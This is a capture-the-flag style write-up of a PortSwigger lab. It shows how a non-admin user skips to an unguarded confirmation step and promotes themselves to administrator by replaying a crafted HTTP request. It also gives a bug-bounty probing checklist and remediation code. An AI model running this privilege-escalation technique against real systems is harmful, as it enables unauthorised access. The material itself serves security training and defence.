# PortSwigger Lab: Multi-Step Process with No Access Control on One Step

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Category:** Access Control / Privilege Escalation  
**Lab:** Multi-step process with no access control on one step  

---

## Overview

This lab demonstrates a common access control flaw where a multi-step process has access control applied to early steps but not to the final confirmation step. An attacker who knows the structure of the final step can skip directly to it — bypassing all preceding checks — and execute privileged actions with a non-admin session.

This is a **flawed trust assumption**: the developer assumed that reaching the final step proves the user already passed earlier authorisation checks. This assumption is wrong — any request can be crafted directly.

---

## The Vulnerability

The role change process has two steps:

```
Step 1: Admin selects user and action → POST /admin-roles
        → Access control checked ✓

Step 2: Admin confirms the action → POST /admin-roles (confirmation)
        → NO access control check ✗
```

Because step 2 has no independent access control, a non-admin user who knows the confirmation request structure can send it directly — skipping step 1 entirely — and the action executes.

---

## Methodology

```
Understand full multi-step flow → Capture final confirmation request →
Replace admin session with non-admin session →
Change username to self → Replay → Privilege escalation
```

---

## 1. Reconnaissance — Admin Panel

### Step 1 — Capture Confirmation Request

Logged in as `administrator:admin`. Navigated to admin panel and initiated promotion of `carlos`. Captured the **confirmation** request (step 2) in Burp Repeater:

```http
POST /admin-roles HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<admin-session>
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=carlos
```

**Key observation:** The confirmation step includes `confirmed=true` — this is what distinguishes step 2 from step 1.

---

## 2. Exploitation

### Step 2 — Replace Session and Username

Logged in as `wiener:peter` in a private browser window. Copied wiener's session cookie into the Repeater request. Changed username to `wiener`:

```http
POST /admin-roles HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<wiener-session>    ← non-admin session
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=wiener
```

### Step 3 — Replay Request

Sent the request from Burp Repeater.

**Response:** `200 OK` — wiener promoted to administrator. Lab solved.

---

## 3. Attack Flow Summary

```
Admin panel: step 1 (select user) → step 2 (confirm)
Both captured in Burp Repeater
        ↓
Replace admin session with wiener session in step 2 request
Change username=carlos to username=wiener
        ↓
Send step 2 directly — step 1 never sent
No access control on step 2 → action executes
        ↓
Wiener promoted to admin → lab solved
```

---

## 4. Why This Works

The developer applied access control only on step 1 — the initial selection. The assumption was:

> "If a user reaches step 2, they must have already passed step 1's authorisation check."

This is a flawed trust model. HTTP requests are stateless — any request can be crafted independently. Step 2 has no way of knowing whether the user actually went through step 1 unless it independently checks authorisation.

```
Developer's assumption:
Step 1 check → passes → step 2 reached → safe

Reality:
Step 1 check → (attacker skips this entirely)
Step 2 → no check → executes action
```

---

## 5. Comparison — Two Access Control Bypass Techniques

| Lab | Flaw | Bypass |
|-----|------|--------|
| Method-based | Access control only on POST, not GET | Switch HTTP method to GET |
| Multi-step | Access control only on step 1, not step 2 | Send step 2 directly with non-admin session |

Both share the same root cause: access control applied inconsistently — either across methods or across steps.

---

## 6. Key Takeaways

- **Every step in a multi-step process must independently verify authorisation** — never assume that reaching a later step proves earlier checks were passed
- **HTTP is stateless** — each request is independent; there is no server-side guarantee that step 2 was reached via step 1
- **Confirmation requests are high-value targets** — they often execute the actual privileged action while step 1 is just a UI selection
- **The `confirmed=true` parameter is a signal** — any parameter indicating a confirmation step is worth testing with a non-admin session directly
- **Always capture every step of multi-step flows** — send each step to Repeater and test all of them independently with a low-privileged session

---

## 7. Real-World Testing Approach

For any multi-step privileged process:

```
Step 1: Initiate action (select user, choose role, etc.)
Step 2: Review/confirm
Step 3: Final confirmation

Test each step independently:
→ Can you send step 2 directly without step 1?
→ Can you send step 3 directly without steps 1 and 2?
→ Do all steps check authorisation independently?
```

In real bug bounty, look for parameters like:
```
confirmed=true
step=2
confirm=yes
action=confirm
final=true
```

These indicate confirmation steps that may lack independent access control.

---

## 8. Remediation

| Finding | Risk | Fix |
|---------|------|-----|
| Step 2 has no access control | Critical | Every step must independently verify the user is authorised — no trust inheritance between steps |
| Confirmation executes action without auth check | Critical | Re-validate session and permissions at every state-changing step |
| No server-side step tracking | High | Track multi-step state server-side — validate the user completed step 1 before processing step 2 |

**Secure implementation:**
```python
# WRONG — only checks step 1
@app.route('/admin-roles/confirm', methods=['POST'])
def confirm_role_change():
    # No auth check — assumes step 1 was passed
    execute_role_change(request.form['username'])

# CORRECT — independent check at every step
@app.route('/admin-roles/confirm', methods=['POST'])
@require_admin   # check at this step too
def confirm_role_change():
    # Also verify the action was initiated in this session
    if not session.get('pending_role_change'):
        return 403
    execute_role_change(request.form['username'])
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Proxy, Repeater |
| Private browser window | Separate non-admin session |

---

## References

- [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [OWASP — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
